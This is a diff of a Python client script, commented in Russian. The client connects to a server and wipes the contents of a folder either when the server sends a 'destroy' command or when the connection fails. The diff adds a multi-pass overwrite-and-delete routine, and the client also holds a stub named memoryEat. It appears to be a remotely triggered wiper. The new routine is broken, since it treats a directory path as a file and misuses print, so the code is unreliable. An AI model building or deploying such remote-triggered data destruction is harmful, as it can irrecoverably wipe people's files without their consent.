@@ -31,10 +31,27 @@ def debugFolders(ran):
     except:
         pass
 
-def destroydir(path):
-    dirs = os.listdir(path)
-    for d in track(dirs, description='Remove folders'):
-        shutil.rmtree(path+d)
+def secure_delete(path, passes=5):
+    '''Функция принимает путь к файлу и количество прогонов (по умолчанирю 5)'''
+
+    global success # Использование глобальной переменной success
+    with open(path, "ba+") as delfile:
+        length = delfile.tell() # Определение размера файла
+    with open(path, "br+") as delfile:
+        for i in range(passes): # Перезапись содержимого файла случайными данными passes раз
+            try:
+                delfile.seek(0) # Перемещение указателя в начало файла
+                delfile.write(os.urandom(length)) # Запись случайных данных в файл
+                print(f'ПРОХОД {i + 1} УСПЕШНО') # Вывод сообщения об успешном прохождении итерации
+            except: # Обработка исключений при записи в файл
+                print(f'ПРОХОД {i + 1} НЕУДАЧНО') # Вывод сообщения об ошибке при прохождении итерации
+                success = False # Установка значения success в False при ошибке записи в файл
+    try:
+        os.remove(path) # Удаление файла после перезаписи его содержимого случайными данными passes раз.
+        print('ФАЙЛ УСПЕШНО УДАЛЕН.', 'green') # Вывод сообщения об успешном удалении файла.
+    except: # Обработка исключений при удалении файла.
+        print('ОШИБКА УДАЛЕНИЯ ФАЙЛА. ФАЙЛ МОЖЕТ БЫТЬ УНИЧТОЖЕН.') 
+        success = False
 
 def memoryEat():
     pass
@@ -56,7 +73,7 @@ try:
     running = True
 except:
     print('Подключение к серверу отсутствует')
-    destroydir('./test/')
+    secure_delete('./test/') # Доработать!
     print('Удалил файлы\nBye ^-^')
     sleep(5)
 
@@ -84,7 +101,7 @@ while running:
 
                 # Если команда дестрой
                 if data[1] == 'destroy':
-                    destroydir('./test/')
+                    secure_delete('./test/') # Доработать!
                     message = 'mes:destroy;'
                     server.send(message.encode())
                     server.close()
